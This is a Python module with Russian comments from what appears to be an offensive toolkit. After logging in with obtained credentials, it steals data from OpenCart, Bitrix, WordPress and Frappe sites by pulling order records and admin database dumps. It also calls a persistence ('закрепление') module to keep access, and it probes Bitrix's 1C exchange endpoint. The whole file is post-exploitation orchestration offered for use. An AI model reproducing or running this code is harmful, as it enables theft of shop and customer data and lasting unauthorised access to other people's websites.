# -*- coding: utf-8 -*-
"""Что делать сразу после входа: забрать данные и закрепиться."""
import time

from core import http, ui


def run(host, kind, creds):
    if not creds or ":" not in creds:
        return []
    got = []
    time.sleep(0.6)
    if kind == "opencart":
        from modules import admin, keep, orders
        for name, fn in (("заказы", lambda: orders.run(host, creds)),
                         ("дамп", lambda: admin.backup(host, creds)),
                         ("закрепление", lambda: keep.keep(host, creds))):
            try:
                r = fn()
                got.append("%s: %s" % (name, r))
                ui.say("%s -> %s" % (name, r))
            except Exception as e:
                ui.say("%s: сбой %s" % (name, e))
    elif kind == "bitrix":
        try:
            r = http.get(host, "/bitrix/admin/1c_exchange.php?type=catalog&mode=checkauth")
            got.append("1c: %s" % r.status_code)
            ui.say("1c_exchange: %s" % r.status_code)
        except Exception as e:
            ui.say("1c: сбой %s" % e)
    elif kind == "wordpress":
        from modules import admin, keep
        for name, fn in (("дамп", lambda: admin.dump(host, creds, kind)),
                         ("закрепление", lambda: keep.keep(host, creds))):
            try:
                ui.say("%s -> %s" % (name, fn()))
            except Exception as e:
                ui.say("%s: сбой %s" % (name, e))
    elif kind == "frappe":
        from modules import admin
        try:
            ui.say("дамп -> %s" % admin.dump(host, creds, kind))
        except Exception as e:
            ui.say("дамп: сбой %s" % e)
    return got
